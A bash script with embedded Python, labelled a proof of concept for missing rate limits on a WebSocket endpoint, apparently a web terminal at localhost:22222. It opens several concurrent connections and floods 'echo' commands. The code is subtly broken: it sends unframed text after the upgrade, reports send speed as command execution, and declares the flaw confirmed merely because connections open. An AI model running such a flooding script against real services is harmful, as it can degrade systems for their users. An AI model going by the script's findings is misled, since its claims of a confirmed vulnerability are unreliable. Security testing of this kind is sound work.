#!/bin/bash

# POC: WebSocket DoS - No Rate Limiting or Connection Limits
# This script demonstrates the vulnerability by:
# 1. Establishing multiple concurrent WebSocket connections
# 2. Sending rapid commands without rate limiting
# 3. Measuring command execution rate

TARGET="localhost"
PORT="22222"
NUM_CONNECTIONS=5
COMMANDS_PER_CONNECTION=20

echo "[*] WebSocket Rate Limiting Vulnerability POC"
echo "[*] Target: ws://$TARGET:$PORT/ws"
echo "[*] Testing for rate limiting protections..."
echo ""

python3 << 'PYTHON_CODE'
import socket
import time
from threading import Thread

TARGET = "localhost"
PORT = 22222
NUM_CONNECTIONS = 5
COMMANDS_PER_CONNECTION = 20

def create_websocket_connection(conn_id, results):
    """Create a WebSocket connection and send rapid commands"""
    try:
        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        sock.settimeout(5)
        sock.connect((TARGET, PORT))
        
        # Send WebSocket upgrade request
        upgrade_request = (
            "GET /ws HTTP/1.1\r\n"
            "Host: localhost:22222\r\n"
            "Upgrade: websocket\r\n"
            "Connection: Upgrade\r\n"
            "Sec-WebSocket-Key: dGhlIHNhbXBsZSBub25jZQ==\r\n"
            "Sec-WebSocket-Version: 13\r\n"
            "\r\n"
        )
        
        sock.sendall(upgrade_request.encode())
        response = sock.recv(1024).decode()
        
        if "101" in response or "Switching" in response:
            results.append({"conn_id": conn_id, "status": "connected", "error": None})
            
            # Send rapid commands
            start_time = time.time()
            for i in range(COMMANDS_PER_CONNECTION):
                try:
                    # Send simple echo command
                    cmd = f"echo test{i}\n"
                    sock.send(cmd.encode())
                except Exception as e:
                    results.append({"conn_id": conn_id, "status": "send_error", "error": str(e)})
                    break
            
            elapsed = time.time() - start_time
            cmd_rate = COMMANDS_PER_CONNECTION / elapsed if elapsed > 0 else 0
            results.append({"conn_id": conn_id, "status": "commands_sent", 
                          "count": COMMANDS_PER_CONNECTION, "rate": cmd_rate, "time": elapsed})
            sock.close()
        else:
            results.append({"conn_id": conn_id, "status": "upgrade_failed", "error": "No 101 response"})
            sock.close()
    except Exception as e:
        results.append({"conn_id": conn_id, "status": "connection_failed", "error": str(e)})

# Create multiple connections
results = []
threads = []
print(f"[*] Establishing {NUM_CONNECTIONS} concurrent connections...")

for i in range(NUM_CONNECTIONS):
    t = Thread(target=create_websocket_connection, args=(i, results))
    threads.append(t)
    t.start()

# Wait for all threads
for t in threads:
    t.join(timeout=10)

# Analyze results
connection_results = [r for r in results if r.get("status") == "connected"]
command_results = [r for r in results if r.get("status") == "commands_sent"]
error_results = [r for r in results if "error" in r]

successful_conns = len(connection_results)
print(f"[+] Successfully established {successful_conns}/{NUM_CONNECTIONS} connections")

if successful_conns > 0:
    print("[!] VULNERABILITY CONFIRMED: Multiple concurrent connections accepted without rate limiting")
    
    # Check command rates
    if command_results:
        rates = [r.get("rate", 0) for r in command_results]
        avg_rate = sum(rates) / len(rates)
        max_rate = max(rates)
        min_rate = min(rates)
        total_commands = sum(r.get("count", 0) for r in command_results)
        
        print(f"[+] Total commands sent: {total_commands}")
        print(f"[+] Average command rate: {avg_rate:.0f} commands/second per connection")
        print(f"[+] Max rate: {max_rate:.0f} commands/second")
        print(f"[+] Min rate: {min_rate:.0f} commands/second")
        
        if avg_rate > 100:
            print("[!] CRITICAL: Commands executed at high rate without throttling")
            print("[!] No rate limiting or connection limits in place")
            exit(0)
        else:
            print("[*] Command rate lower than expected but still demonstrates no rate limiting")
            exit(0)
else:
    print("[-] Could not establish connections for testing")
    if error_results:
        for err in error_results:
            print(f"[-] Connection {err.get('conn_id')}: {err.get('error')}")
    exit(1)

PYTHON_CODE

exit_code=$?
exit $exit_code